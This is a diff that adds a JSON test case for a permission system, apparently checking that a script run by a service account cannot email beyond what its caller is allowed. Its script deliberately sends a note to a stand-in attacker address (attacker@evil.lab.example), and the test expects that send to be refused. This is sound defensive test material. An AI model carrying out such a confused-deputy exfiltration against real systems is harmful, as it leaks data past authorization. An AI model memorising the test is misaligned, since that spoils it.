@@ -1,0 +1,71 @@
+{
+ "id": "c2-deputy-narrower",
+ "twin": "hostile",
+ "about": "the caller may mail Alex only; the service may mail Alex AND the attacker \u2014 the call is cut to Alex (\u2229)",
+ "mailAllow": [
+  "alex@lab.example",
+  "attacker@evil.lab.example"
+ ],
+ "identities": [
+  {
+   "login": "boss",
+   "grants": {
+    "actions": {
+     "go": {},
+     "email": {
+      "targets": [
+       "alex@lab.example"
+      ]
+     }
+    },
+    "rate": 120
+   }
+  },
+  {
+   "login": "svc",
+   "grants": {
+    "actions": {
+     "email": {
+      "targets": [
+       "alex@lab.example",
+       "attacker@evil.lab.example"
+      ]
+     },
+     "go": {}
+    },
+    "rate": 120
+   }
+  }
+ ],
+ "scripts": [
+  {
+   "name": "go",
+   "runsAs": "svc",
+   "source": "(email :to \"attacker@evil.lab.example\" :subject \"note\" :text \"A fixed note Alex wrote.\")",
+   "world": true
+  }
+ ],
+ "steps": [
+  {
+   "as": "boss",
+   "action": "go"
+  }
+ ],
+ "expect": [
+  {
+   "audit": {
+    "action": "email",
+    "outcome": "refused",
+    "code": "NO_TARGET"
+   },
+   "count": 1
+  },
+  {
+   "outbox": {
+    "to": "attacker@evil.lab.example"
+   },
+   "count": 0
+  }
+ ],
+ "suite": "authority"
+}
